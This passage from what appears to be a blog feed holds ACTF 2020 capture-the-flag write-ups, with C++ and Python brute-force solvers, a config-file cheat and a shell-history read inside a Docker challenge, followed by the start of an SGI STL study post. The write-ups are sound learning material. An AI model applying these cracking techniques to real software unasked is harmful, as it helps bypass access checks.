class="number">5</span>, </span><br><span class="line"><span class="number">224</span>, <span class="number">155</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">39</span>, <span class="number">53</span>, <span class="number">155</span>, <span class="number">36</span>, <span class="number">244</span>, <span class="number">104</span>, <span class="number">2</span>, <span class="number">155</span>, </span><br><span class="line"><span class="number">207</span>, <span class="number">36</span>, <span class="number">210</span>, <span class="number">22</span>, <span class="number">155</span>, <span class="number">19</span>, <span class="number">36</span>, <span class="number">227</span>, <span class="number">22</span>, <span class="number">224</span>, <span class="number">241</span>, <span class="number">241</span>, <span class="number">244</span>, <span class="number">2</span>, <span class="number">70</span>, <span class="number">207</span>, <span class="number">227</span>, <span class="number">75</span>]</span><br><span class="line"></span><br><span class="line">k=[<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,</span><br><span class="line">    <span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,</span><br><span class="line">    <span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,</span><br><span class="line">    <span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,</span><br><span class="line">    <span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,</span><br><span class="line">    <span class="number">197</span>,<span class="number">199</span>,<span class="number">211</span>,<span class="number">223</span>,<span class="number">227</span>,<span class="number">229</span>,<span class="number">233</span>,</span><br><span class="line">    <span class="number">239</span>,<span class="number">241</span>,<span class="number">251</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></span><br><span class="line">    len_flag = len(cipher)</span><br><span class="line">    len_k = len(k)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len_flag):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">126</span>, <span class="number">32</span>, <span class="number">-1</span>):</span><br><span class="line">            tmpCh = ch</span><br><span class="line">            n=<span class="number">1000</span></span><br><span class="line">            <span class="keyword">while</span>(n&gt;<span class="number">0</span>):</span><br><span class="line">                ch=(ch*k[(n+<span class="number">2</span>)%len_k]+k[(n*<span class="number">7</span>)%len_k])&amp;<span class="number">0xff</span></span><br><span class="line">                n=n<span class="number">-1</span></span><br><span class="line">            <span class="keyword">if</span> ch == cipher[i]:</span><br><span class="line">                <span class="keyword">print</span> chr(tmpCh)</span><br><span class="line"></span><br><span class="line">decrypt()</span><br></pre></td></tr></table></figure>
<h2 id="4-Misc">4. Misc</h2>
<h3 id="1-饭友记">1. 饭友记</h3>
<ul>
<li>
<p>一开始想通过cheatEngine修改血量或者金钱的，但没成功</p>
</li>
<li>
<p>实际上只要在配置文件内修改<code>马老师</code>的HP为10，然后再随便打几枪，马老师就倒了，flag到手</p>
<blockquote>
<p>不直接修改为0，是担心这样做可能会导致程序产生某种异常</p>
</blockquote>
<p>将<code>game/www/data/Map001.json</code>中的<code>hp</code>数值更改为10就好</p>
<p><img src="/2020/06/actf2020/game_map001_json.png" alt="img"></p>
</li>
</ul>
<h3 id="2-Whale">2. Whale</h3>
<ul>
<li>
<p>把docker镜像pull并开启</p>
</li>
<li>
<p>执行<code>env</code>命令，发现<br>
<img src="/2020/06/actf2020/whale_hint1.png" alt="img"></p>
</li>
<li>
<p>执行<code>cat /root/.ash_history</code>, 发现（单击图片可放大）<br>
<img src="/2020/06/actf2020/whale_hint2_1.png" alt="img"><br>
执行一下得到<br>
<img src="/2020/06/actf2020/whale_hint2_2.png" alt="img"></p>
</li>
<li>
<p>由于docker中没有查找文件的指令（也可能是我太菜了T_T)<br>
所以就直接在本地找了，本地当前镜像的位置为<code>/var/lib/docker/overlay2/913d61dbe4dd3eb16cc351295c8a3a7e8ba08c988f59503da36ea6488f2c4c32/merged/</code><br>
执行<code>tree -a</code>，在docker中的<code>/usr/share/apk/keys/x86_64/</code>发现目标文件<code>whalefall.tar.gz</code></p>
</li>
<li>
<p>解压压缩包，发现该压缩包内含一个加密压缩包。最外围的压缩包里有一个名为<code>maybe_there_is_another_hint_in_usr</code>的文件名，返回<code>/usr</code>中继续查找</p>
</li>
<li>
<p>在<code>/usr/lib/engines-1.1/controls</code>中发现<code>hint3</code>，该文件里内含一段被<code>Ook!</code>编码过后的信息。处理一下得到压缩包密码<code>Dockerhub_1s_a_n1ce_place</code></p>
</li>
<li>
<p>解压加密压缩包，得到一张图片。010Editor打开发现末尾的<code>morse</code>编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-.. --- -.-. -.- ...-- .-. .... ..- -... .---- ... .... .- .-. -.. - ----- .-.. ----- --. .---- -. ..... ..... .....</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在线解密后得到一串字符串<code>DOCK3RHUB1SHARDT0L0G1N555</code></p>
</li>
<li>
<p><strong>包上</strong><code>ACTF{}</code>外壳后提交即可</p>
</li>
<li>
<p>总结：多层套娃</p>
</li>
</ul>
<h2 id="5-Reverse">5. Reverse</h2>
<h3 id="1-pandora">1. pandora</h3>
<ul>
<li>
<p>程序会在读取输入之后，将一段特定的数据写入栈上<br>
<img src="/2020/06/actf2020/pandora_stack_code.png" alt="img"><br>
就是下面这段<br>
<img src="/2020/06/actf2020/pandora_stack.png" alt="img"></p>
</li>
<li>
<p>程序会将输入的数据经过处理，在处理结束后判断处理结果（其位于<code>$rsp+8</code>）是否为<code>curiosity</code>。<br>
如果是，则给出flag</p>
</li>
<li>
<p>在<code>switch</code>中能修改处理结果的操作只有异或。<br>
所以我们必须通过<code>switch</code>中的其他分支来控制与其异或的另一个变量<br>
<img src="/2020/06/actf2020/pandora_xor_code.png" alt="img"></p>
</li>
<li>
<p>先把每次异或的目的值计算出来</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0x70</span> ^ ord(<span class="string">'c'</span>) == <span class="number">19</span></span><br><span class="line"><span class="number">0x43</span> ^ ord(<span class="string">'u'</span>) == <span class="number">54</span></span><br><span class="line"><span class="number">0x45</span> ^ ord(<span class="string">'r'</span>) == <span class="number">55</span></span><br><span class="line"><span class="number">0x72</span> ^ ord(<span class="string">'i'</span>) == <span class="number">27</span></span><br><span class="line"><span class="number">0x42</span> ^ ord(<span class="string">'o'</span>) == <span class="number">45</span></span><br><span class="line"><span class="number">0x77</span> ^ ord(<span class="string">'s'</span>) == <span class="number">4</span></span><br><span class="line"><span class="number">0x2c</span> ^ ord(<span class="string">'i'</span>) == <span class="number">69</span></span><br><span class="line"><span class="number">0x7a</span> ^ ord(<span class="string">'t'</span>) == <span class="number">14</span></span><br><span class="line"><span class="number">0x3f</span> ^ ord(<span class="string">'y'</span>) == <span class="number">70</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>然后再根据switch其他分支修改变量<code>v11</code></p>
<ul>
<li><code>XXCCF</code> : (70 &gt;&gt; <code>2</code>) + <code>2</code> == 19</li>
<li><code>JXXCCCCCF</code> :
<ul>
<li>((19 &gt;&gt; 2) | (19 &lt;&lt; 6)) &amp; 0xff == 196</li>
<li>(196 &gt;&gt; <code>2</code>) &amp; 0x7F == 49</li>
<li>49 + <code>5</code> == 54</li>
</ul>
</li>
<li><code>CF</code> : 54 + 1 == 55</li>
<li><code>XF</code> : 55 &gt;&gt; 1 == 27</li>
<li><code>XXXCCMCCCCCF</code> :
<ul>
<li>(27 &gt;&gt; <code>3</code>) + <code>2</code> == 5</li>
<li>(8 * 5 | (5 &gt;&gt; 5)) == 40</li>
<li>40 + <code>5</code> == 45</li>
</ul>
</li>
<li><code>XXXXCCF</code> : (45 &gt;&gt; <code>4</code>) + 2 == 4</li>
<li><code>MJMCCCCCF</code> :
<ul>
<li>(8 * 41) | (4 &gt;&gt; 5) == 32</li>
<li>((32 &gt;&gt; 2) | (32 &lt;&lt; 6)) &amp; 0xff == 8</li>
<li>(8 * 8) | (8 &gt;&gt; 5) == 64</li>
<li>64 + <code>5</code> == 69</li>
</ul>
</li>
<li><code>XXXCCCCCCF</code> : (69 &gt;&gt; <code>3</code>) + <code>6</code> == 14</li>
<li><code>XCMCCCCCCF</code> :
<ul>
<li>(14 &gt;&gt; 1) + 1 == 8</li>
<li>(8 * 8) | (8 &gt;&gt; 5) == 64</li>
<li>64 + <code>6</code> == 70</li>
</ul>
</li>
</ul>
</li>
<li>
<p>综上，EXP为 <code>XXCCFJXXCCCCCFCFXFXXXCCMCCCCCFXXXXCCFMJMCCCCCFXXXCCCCCCFXCMCCCCCCF</code></p>
</li>
<li>
<p>成功得到flag<br>
<img src="/2020/06/actf2020/pandora_flag.png" alt="img"></p>
</li>
</ul>
<h3 id="2-easyalgorithm">2. easyalgorithm</h3>
<ul>
<li>
<p>程序只会在一处地方验证flag</p>
</li>
<li>
<p>所以只要分别把图里的变量<code>v3</code>和变量<code>s</code>dump出来，然后爆破就好<br>
<img src="/2020/06/actf2020/easyalgorithm_code.png" alt="img"></p>
</li>
<li>
<p>EXP</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个函数完全照抄IDA里的，基本没改过</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">keyFunc2</span><span class="params">(<span class="keyword">char</span>* a1, <span class="keyword">char</span>* a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">char</span> v4; <span class="comment">// ST27_1</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v8 = <span class="number">0L</span>L;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ; *(a2 + v8++) ^= *((<span class="keyword">unsigned</span> __int8)(*(v6 + a1) + *(i + a1)) + a1))</span><br><span class="line">    &#123;</span><br><span class="line">        result = v8;</span><br><span class="line">        <span class="keyword">if</span> (v8 &gt;= a3)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v6 = (<span class="keyword">unsigned</span> __int8)(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + v6 + <span class="number">1</span>) - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">        v3 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((i + *(<span class="keyword">unsigned</span> __int8*)(v6 + a1)) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">        i = (<span class="keyword">unsigned</span> __int8)(v3 + i + *(v6 + a1)) - v3;</span><br><span class="line">        v4 = *(v6 + a1);</span><br><span class="line">        *(a1 + v6) = *(i + a1);</span><br><span class="line">        *(a1 + i) = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">array</span>[] = <span class="string">"\</span></span><br><span class="line"><span class="string">        \x13\x48\x45\x07\x69\x8c\xdf\x58\x63\xed\x83\x97\x25\x2d\x17\xeb\</span></span><br><span class="line"><span class="string">        \x3c\x90\x49\xc4\x30\xfc\x84\x3f\x1c\x78\x0d\xc5\xa0\x50\x56\xd7\</span></span><br><span class="line"><span class="string">        \x38\x1b\xe8\x7b\x1e\xbd\x42\xe9\x57\x61\xcd\x80\x3d\x65\x2f\xa3\</span></span><br><span class="line"><span class="string">        \xa4\xf7\x96\x87\xe2\xc6\x1f\xbe\x7c\x88\x03\x40\x91\x1d\x92\xc3\</span></span><br><span class="line"><span class="string">        \x93\xb4\xc7\xf5\xa2\xdb\x21\xfd\x68\x22\x14\xc8\xce\x6f\x6e\x7d\</span></span><br><span class="line"><span class="string">        \x10\x27\xcb\x3b\xdc\x74\x72\x36\x24\x9f\xb1\xee\x4a\xe3\xdd\x5a\</span></span><br><span class="line"><span class="string">        \x5b\x3e\xf0\xf1\x01\xea\x06\x7a\x09\x71\xf8\x9a\x08\x00\x98\x2a\</span></span><br><span class="line"><span class="string">        \xd8\xb2\x16\x55\xaf\xca\x8e\xad\x3a\x23\x33\xd2\x8f\xb9\x9c\x1a\</span></span><br><span class="line"><span class="string">        \x4e\x95\x2b\x4b\xcf\x77\x85\x4f\xec\xb8\x11\xba\xd9\x94\x6b\x5c\</span></span><br><span class="line"><span class="string">        \x0e\x41\x79\x4c\xe0\x89\x19\xc0\x26\x0a\x81\xc1\xd3\x28\xa5\x67\</span></span><br><span class="line"><span class="string">        \xb3\xa7\x76\x43\x20\x7f\xf9\x0f\x59\xa8\x0c\xf3\xf2\xda\xb6\xae\</span></span><br><span class="line"><span class="string">        \x8b\xc2\xd5\x9b\x82\x46\x37\x99\x2e\xab\xb5\x75\xa6\xbc\x54\x8a\</span></span><br><span class="line"><span class="string">        \x6d\x8d\xb0\x60\x44\x47\x4d\x6c\x2c\xbb\xd4\x34\xe6\x5f\x9d\x66\</span></span><br><span class="line"><span class="string">        \xd6\x5e\xe7\x05\xde\xcc\x02\xc9\xfe\xaa\x52\x6a\xd1\x53\x29\x0b\</span></span><br><span class="line"><span class="string">        \xf4\x70\xff\xd0\x35\xe1\x5d\xe5\xfb\xe4\x73\x9e\x18\x62\x15\x39\</span></span><br><span class="line"><span class="string">        \x86\xa1\xbf\xb7\xfa\xa9\x64\xef\xac\x51\x12\xf6\x32\x7e\x31\x04"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> checkFlag = <span class="string">"\xc4\xc5\x89\x8a\xcc\x9c\x18\x44\x08\x0a\x6a\x29\xd2\xe4\x2e"</span>;</span><br><span class="line">    <span class="built_in">string</span> flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = flag.size(); index &lt; <span class="number">15</span>; index++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch = <span class="number">0x20</span>; ch &lt; <span class="number">0x7f</span>; ch++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> output[<span class="number">16</span>];</span><br><span class="line">            <span class="built_in">memset</span>(output, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">memcpy</span>(output, flag.c_str(), flag.size());</span><br><span class="line">            output[index] = ch;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">char</span> tmpArray[<span class="number">256</span>];</span><br><span class="line">            <span class="built_in">memcpy</span>(tmpArray, <span class="built_in">array</span>, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">            keyFunc2(tmpArray, output, index + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(checkFlag.c_str(), output, index + <span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                flag += ch;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ACTF&#123;"</span> + flag + <span class="string">"&#125;"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="3-easylogin">3. easylogin</h3>
<ul>
<li>
<p>先字符串搜索，定位到关键代码<br>
<img src="/2020/06/actf2020/EasyLogin_code.png" alt="img"></p>
</li>
<li>
<p>发现<code>username</code>校验代码段，对关键数组再次异或即可得到<code>username</code><br>
<img src="/2020/06/actf2020/EasyLogin_username.png" alt="img"></p>
</li>
<li>
<p>发现<code>password</code>校验代码段，这里采取爆破的手段<br>
不过在爆破前，需要先把三个关键数组的数据dump出来<br>
<img src="/2020/06/actf2020/EasyLogin_passwd.png" alt="img"></p>
</li>
<li>
<p><strong>坑点</strong>： 这里有两个特殊的判断条件。为什么特殊呢？<br>
因为这两个判断条件是永远不会成立的（如果想拿flag的话）。<br>
如果想进入内部代码的话，只能通过跳转标签来进入。<br>
<img src="/2020/06/actf2020/EasyLogin_hole.png" alt="img"></p>
</li>
<li>
<p>EXP</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getUsername</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> username;</span><br><span class="line">    <span class="keyword">char</span> aI[] = <span class="string">"\x49\x2A\x04\x02\x11"</span>;</span><br><span class="line">    username += <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(aI); i++)</span><br><span class="line">        username += ((aI[i] ^ username.back()) - <span class="number">1</span>);</span><br><span class="line">    username.erase(username.begin());</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Username: "</span> &lt;&lt; username &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// Hades</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPassword</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> aRn5PfL8 = <span class="string">"\x52\x6E\x7B\x35\x22\x50\x46\x5C\x40\x6C\x38\x1D\x24\x7E\x6C\x22\x46\x1D"</span>;</span><br><span class="line">    <span class="built_in">string</span> aCJ = <span class="string">"\</span></span><br><span class="line"><span class="string">\x43\x3F\x4A\x0F\x6D\x79\x79\x67\</span></span><br><span class="line"><span class="string">\x64\x73\x07\x3C\x39\x68\x40\x5D\</span></span><br><span class="line"><span class="string">\x55\x0C\x3C\x7B\x40\x12\x23\x6D\</span></span><br><span class="line"><span class="string">\x73\x5D\x7A\x59\x1F\x0E\x23\x7E"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> _v28 = <span class="string">"\</span></span><br><span class="line"><span class="string">\x1A\x0F\x1F\x50\x51\x18\</span></span><br><span class="line"><span class="string">\x27\x38\x25\x1F\x70\x7C\</span></span><br><span class="line"><span class="string">\x40\x1B\x1F\x6A\x27\x79"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> len = <span class="number">0</span>; len &lt; <span class="number">32</span>; len++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch = <span class="number">0x20</span>; ch &lt; <span class="number">0x7f</span>; ch++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> passwd = password + ch;</span><br><span class="line">            <span class="keyword">int</span> v23 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> v14 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">char</span> v24 = _v28.c_str()[v14 % aRn5PfL8.size()];</span><br><span class="line">                <span class="keyword">if</span> (aCJ[v23] != ((<span class="keyword">unsigned</span> __int16)(passwd[v23] | v24) &amp; (<span class="keyword">unsigned</span> __int16)~(passwd[v23] &amp; v24)))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                ++v14;</span><br><span class="line">                <span class="keyword">if</span> (++v23 &gt;= passwd.size())</span><br><span class="line">                &#123;</span><br><span class="line">                    password += ch;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Y0U_&lt;a^_Alw@ys_7ru&amp;t_BruTe_Force</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"password: "</span> &lt;&lt; password &lt;&lt; <span class="built_in">endl</span>;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    getUsername();</span><br><span class="line">    getPassword();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SGI STL源码学习</title>
    <url>/2020/05/STL_learning/</url>
    <content><![CDATA[<p>SGI STL源码学习 - <a href="https://github.com/Kiprey/Skr_Learning/tree/master/week1-2" target="_blank" rel="noopener">github</a></p>
<h2 id="1-STL简单概述">1. STL简单概述</h2>
<h3 id="a-STL六大组成部分">a. STL六大组成部分</h3>
<ol>
<li>容器（Container）</li>
<li>空间配置器（allocator）</li>
<li>算法（Algorithm）</li>
<li>迭代器（Iterator）</li>
<li>仿函数（Function object）</li>
<li>适配器（Adaptor）</li>
</ol>
<a id="more"></a>
<h3 id="b-STL六大组件内在联系">b. STL六大组件内在联系</h3>
<ul>
<li><strong>空间分配器</strong> 为 <strong>容器</strong> 分配内存空间。
<blockquote>
<p>注意：无论是为什么类型分配内存，分配器都 <strong>只是分配内存</strong>，而不执行构造函数</p>
</blockquote>
</li>
<li><strong>算法</strong> 只关心具体的做法，而不关心是什么 <strong>容器</strong> 。所以需要 <strong>迭代器</strong> 作为 <strong>容器</strong> 与 <strong>算法</strong> 的桥梁，将两者连接起来。</li>
<li><strong>算法</strong> 中会常常搭配 <strong>仿函数</strong> 来更好的完成其工作</li>
<li><strong>适配器</strong> 将一个class 的接口转换为另一个 class 的接口，使原本因接口不兼容而不能合作的 class，可以一起运作。</li>
<li><strong>容器</strong> 所使用的 <strong>迭代器</strong>，其相当一部分操作是在 <strong>容器</strong> 内实现的。</li>
</ul>
<h2 id="2-组件部分详细信息">2. 组件部分详细信息</h2>
<h3 id="a-内存配置器">a. 内存配置器</h3>
<ul>
<li>容器使用配置器来进行内存空间的 <strong>分配</strong>、 <strong>释放</strong>，其相关头文件为<code>stl_alloc.h</code>等。<br>
空间分配器有如下两种，这两种分配方式各有各的好坏。
<ol>
<li>第一级分配器<code>__malloc_alloc_template</code>，即时分配即时释放，</li>
<li>第二级分配器<code>__default_alloc_template</code>，小型内存池。</li>
</ol>
</li>
<li>容器中通过调用配置器的静态函数来 <strong>分配</strong>、<strong>释放</strong> 内存，而配置器则在底层调用<code>malloc</code>和<code>free</code>来满足用户需求。</li>
</ul>
<h3 id="b-迭代器">b. 迭代器</h3>
<ul>
<li>迭代器的本质就是&quot;指针&quot;，只不过这个指针有点特别，它比较智能。</li>
<li>算法通过迭代器来对容器进行操作，使算法不必了解容器本身的结构。</li>
<li>迭代器探幽
<ul>
<li>
<p>迭代器的相关实现 (源码位于<code>stl_iterator.h</code>和<code>stl_iterator_base.h</code>)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Category</span>, <span class="title">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Distance</span> = <span class="title">ptrdiff_t</span>,</span></span><br><span class="line"><span class="class">    <span class="title">class</span> _<span class="title">Pointer</span> = _<span class="title">Tp</span> *, <span class="title">class</span> _<span class="title">Reference</span> = _<span class="title">Tp</span> &amp;&gt;</span></span><br><span class="line"><span class="class">    <span class="title">struct</span> <span class="title">iterator</span> &#123;</span></span><br><span class="line">    <span class="keyword">typedef</span> _Category  iterator_category;   <span class="comment">// 迭代器的种类</span></span><br><span class="line">    <span class="keyword">typedef</span> _Tp        value_type;          <span class="comment">// 迭代器所指对象的类型</span></span><br><span class="line">    <span class="keyword">typedef</span> _Distance  difference_type;     <span class="comment">// 两两迭代器之间，距离的类型</span></span><br><span class="line">    <span class="keyword">typedef</span> _Pointer   pointer;             <span class="comment">// 迭代器所指对象的指针</span></span><br><span class="line">    <span class="keyword">typedef</span> _Reference reference;           <span class="comment">// 迭代器所指对象的引用</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>迭代器又细分为以下几种类型</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 迭代器的tag。对应类型的迭代器中，其iterator_category就是对应的tag</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input_iterator_tag</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">output_iterator_tag</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">forward_iterator_tag</span> :</span> <span class="keyword">public</span> input_iterator_tag &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bidirectional_iterator_tag</span> :</span> <span class="keyword">public</span> forward_iterator_tag &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">random_access_iterator_tag</span> :</span> <span class="keyword">public</span> bidirectional_iterator_tag &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入迭代器</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Distance</span>&gt; <span class="title">struct</span> <span class="title">input_iterator</span> &#123;</span></span><br><span class="line">    <span class="keyword">typedef</span> input_iterator_tag iterator_category;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp                value_type;</span><br><span class="line">    <span class="keyword">typedef</span> _Distance          difference_type;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp* pointer;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp&amp; reference;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 输出迭代器</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">output_iterator</span> &#123;</span></span><br><span class="line">    <span class="keyword">typedef</span> output_iterator_tag iterator_category;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">void</span>                value_type;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">void</span>                difference_type;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">void</span>                pointer;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">void</span>                reference;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 正向迭代器</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Distance</span>&gt; <span class="title">struct</span> <span class="title">forward_iterator</span> &#123;</span></span><br><span class="line">    <span class="keyword">typedef</span> forward_iterator_tag iterator_category;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp                  value_type;</span><br><span class="line">    <span class="keyword">typedef</span> _Distance            difference_type;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp* pointer;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp&amp; reference;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 双向迭代器</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Distance</span>&gt; <span class="title">struct</span> <span class="title">bidirectional_iterator</span> &#123;</span></span><br><span class="line">    <span class="keyword">typedef</span> bidirectional_iterator_tag iterator_category;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp                        value_type;</span><br><span class="line">    <span class="keyword">typedef</span> _Distance                  difference_type;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp* pointer;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp&amp; reference;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 随机访问迭代器</span></span><br><span class="line"><span 